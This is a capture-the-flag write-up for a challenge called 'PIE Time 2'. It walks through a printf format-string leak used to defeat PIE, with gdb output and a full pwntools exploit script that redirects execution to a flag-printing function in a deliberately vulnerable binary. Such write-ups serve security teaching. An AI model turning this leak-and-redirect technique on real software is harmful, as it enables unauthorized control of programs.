# PIE Time 2

Author: Darkraicg492

> Description: Can you try to get the flag? I'm not revealing anything anymore!! 


In this challenge we have given a C Code `vuln.c` along with a binary executable `vuln`

The program works as follows - 

```bash

$ ./vuln
Enter your name:tushar
tushar
 enter the address to jump to, ex => 0x12345: xyz
Segfault Occurred, incorrect address.

```

Umm... Interesting. Let's analyze security properties of givne binary using `checksec` command.

```bash

$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable        FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   81 Symbols        No    0               2 vuln

```

Here PIE is enabled for the executable as we can see

## What is PIE?
PIE stands for Position Independent Executable. It’s a compiler feature that makes a program’s code segment (the .text section) load at a random address in memory every time the program is run.

In other words, the base address of the binary changes each time, just like shared libraries under ASLR (Address Space Layout Randomization).

### Why PIE Matters in Exploitation
In binaries without PIE, the code segment is loaded at a fixed address. That means:

- Function addresses (like main() or win()) are always the same.
- You can hardcode return addresses or ROP gadgets.
- Exploitation is easier.

In PIE-enabled binaries:

- The code segment is loaded at a random base address.
- You can’t hardcode absolute addresses.
- You must first leak an address and calculate the offset.


Now given vuln.c code is -

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}

```

The `main` function here calling another function `call_functions`

The function `call_functions` is taking a input name and then taking a input address and will call the function at that memory address.

The `win` function here is printing the flag from a file flag.txt, which is most prolly on the remote server

To test our exploit locally, we’ll create a dummy `flag.txt` file with a fake flag:

```
## flag.txt

flag{fake_flag}
```


Now the exploit here is to pass address of `win` function in the memory address input and hence the flag from `flag.txt` will get printed.

Since PIE is enabled we need to leak a runtime memory address of any function/variable in order to calculate offset for win function to evaluate actual runtime address of win function.

Now if we look at the code inside function `call_functions`
```c
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);
```

The `buffer` directly passed to printf which can cause the **format string** vulnerability.

We can print data on stack using `%x` as input

```bash
$ ./vuln
Enter your name:%x%x%x
25782578fbad2288a782578
 enter the address to jump to, ex => 0x12345:
```

Similarly `%p` can be  used to leak memory addresses.

Now lets run `vuln` and attach a debugger to it  -


```bash
$ ./vuln
Enter your name:

```

In another terminal windows attach `gdb`

```bash

$ ps ax  | grep vuln
   4053 pts/2    S+     0:00 ./vuln
   4287 pts/4    S+     0:00 grep --color=auto vuln

```

copy the PID (here it is 4053)

and run `gdb` to diassemble main function

```bash
$ gdb -p 4053 
....
....
....
(gdb) disas main
Dump of assembler code for function main:
   0x0000558dff422400 <+0>:     endbr64
   0x0000558dff422404 <+4>:     push   %rbp
   0x0000558dff422405 <+5>:     mov    %rsp,%rbp
   0x0000558dff422408 <+8>:     lea    -0x166(%rip),%rsi        # 0x558dff4222a9 <segfault_handler>
   0x0000558dff42240f <+15>:    mov    $0xb,%edi
   0x0000558dff422414 <+20>:    call   0x558dff422170 <signal@plt> 
   0x0000558dff422419 <+25>:    mov    0x2bf0(%rip),%rax        # 0x558dff425010 <stdout@@GLIBC_2.2.5>
   0x0000558dff422420 <+32>:    mov    $0x0,%ecx
   0x0000558dff422425 <+37>:    mov    $0x2,%edx
   0x0000558dff42242a <+42>:    mov    $0x0,%esi
   0x0000558dff42242f <+47>:    mov    %rax,%rdi
```

This will leak the address of main `0x558dff422400`

Now let's input approx 20 `%p` as name input (random value) also enter `c` in gdb to continue the running process

```bash
$ ./vuln
Enter your name:%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
0x558e0c8f22a1 0xfbad2288 0xf370dd5f 0x558e0c8f22dd 0x4 0x7f13cba5eff0 (nil) 0x252070252070252e 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0xa70252070 0x7fff5a77e8a0 0x5e3b980a6f49e900 0x7fff5a77e8a0 0x558dff422441 0x1
```

At postion of 19th %p we get `0x558dff422441` which is only at a gap of hex 0x41 from the address of main function `0x558dff422400`

This value can be used to reterive address of win function.

What to do ?
 
- calculate win offeset
- use actual address of main and offset to get actuall memory address of win
- pass address of win in 2nd input to run win function and hence get the flag

We'll do so by the following python script.

```python
from pwn import *


binary = ELF("./vuln")
# print(binary.symbols)
win_offset = binary.symbols["main"] - binary.symbols["win"]
print("Win offset: ", hex(win_offset))


## remote process
HOST = "..."
PORT = "..."
# p = remote(HOST, PORT)

p = process("./vuln")
p.recvuntil(b"name:")

payload = b"%19$p"
p.sendline(payload)

v = p.recvline().strip()
main_address = int(v, 16) - 0x41
print(f"Main memory address: {hex(main_address)}")

win_address = main_address - win_offset
print(f"Win memory address: {hex(win_address)}")

p.sendline(hex(win_address).encode())


p.interactive()
```


This script first calculate offset using the symbol address of main and win which are hardcoded in binary.

Symbol address is the offset of a function or variable inside the binary file.
Runtime address is the actual memory address where it's loaded during execution, calculated as base address + symbol offset (important when PIE is enabled).
When PIE is disabled both are same

Then it uses payload `%19$p` for name input to print the address that we previously got as `0x558dff422441`, then we'll calculate address of main by subtracting 0x41 from it.
after that we'll subtract our offset from address of main to get the win address.

and thus pass that win address for 2nd input value to get win executed and hence the flag will be printed.

```bash
$ python sol.py
[*] '/mnt/d/work/picoctf/pie-time-2/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
Win offset:  0x96
[+] Starting local process './vuln': pid 5402
b'0x55702d409441'
Main memory address: 0x55702d409400
Win memory address: 0x55702d40936a
[*] Switching to interactive mode
 enter the address to jump to, ex => 0x12345: You won!
flag{fake_flag}
[*] Got EOF while reading in interactive
$
```

Wow!!! we got the flag in our local environment successfully, in similar way we can do it on remote server by replacing the HOST and PORT with host and port of instance you started.
